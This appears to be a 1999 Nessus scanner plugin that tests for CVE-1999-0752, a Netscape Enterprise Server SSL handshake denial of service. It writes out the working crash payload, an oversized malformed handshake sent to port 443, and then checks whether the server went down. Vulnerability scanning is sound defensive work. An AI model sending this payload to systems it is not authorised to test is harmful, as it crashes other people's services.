#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10155);
 script_bugtraq_id(516);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-1999-0752");
 name["english"] = "Netscape Enterprise Server DoS";
 name["francais"] = "Déni de service contre Netscape Entrerprise Server";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
There is a SSL handshake bug in the remote
secure web server which could lead into a 
denial of  service.

An attacker may use this flaw to prevent your
site from working properly.

Solution : if you are using Netscape Enterprise
Server, there is a patch available at :
http://help.netscape.com/business/filelib.html#SSLHandshake
Or else, report this vulnerability to your vendor.


BugTraq id : 516
Risk factor : High";


 desc["francais"] = "
Il y a un bug dans le handshake SSL du serveur
web sécurisé distant qui a mené à un déni
de service.

Des pirates peuvent utiliser ce problème pour
empecher votre site de fonctionner normallement.

Solution : si vous utilisez Netscape Enterprise
Server, il y a un patch disponible à :
http://help.netscape.com/business/filelib.html#SSLHandshake
Sinon, rapportez cette vulnérabilité à votre vendeur.


ID BugTraq : 516
Facteur de risque : Sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote SSL server";
 summary["francais"] = "Plante le serveur SSL distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_keys("www/iplanet");
 script_require_ports(443);
 exit(0);
}

#
# The script code starts here
#

port = 443;
if(get_port_state(port))
{
 soc = open_sock_tcp(port, transport:ENCAPS_IP);
 if(soc)
 {
 s = raw_string(46, 46, 8, 
 0x01, 0x03, 0x00, 0x00, 0x0c,
 0x00, 0x00, 0x00, 0x10, 0x02,
 0x00, 0x80, 0x04, 0x00, 0x80,
 0x00, 0x00, 0x03, 0x00, 0x00,
 0x06) + crap(length:65516, data:".");
 send(socket:soc, data:s);
 close(soc);
 sleep(5);
 soc = open_sock_tcp(port);
 if(!soc)security_hole(port);
 else close(soc);
 }
}
 
